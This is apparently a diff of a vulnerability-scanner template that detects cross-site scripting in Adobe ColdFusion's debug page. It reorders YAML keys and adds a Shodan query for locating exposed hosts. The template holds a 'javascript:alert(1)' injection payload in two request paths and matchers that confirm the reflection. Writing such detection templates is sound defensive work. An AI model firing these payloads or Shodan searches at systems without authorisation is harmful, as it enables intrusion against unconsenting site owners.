@@ -1,5 +1,4 @@
 id: coldfusion-debug-xss
-
 info:
   name: Adobe ColdFusion - Cross-Site Scripting
   author: dhiyaneshDK
@@ -14,28 +13,25 @@ info:
     cpe: cpe:2.3:a:adobe:coldfusion:*:*:*:*:*:*:*:*
   metadata:
     max-request: 2
+    product: coldfusion
+    shodan-query: http.component:"Adobe ColdFusion"
     vendor: adobe
-  tags: adobe,coldfusion,xss,vuln
-
+  tags: adobe,coldfusion,vuln,xss
 http:
-  - method: GET
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - '"cf_main_cf" src="javascript:alert(1)"'
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
       - '{{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"cf_main_cf" src="javascript:alert(1)"'
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
-      - type: status
-        status:
-          - 200
-
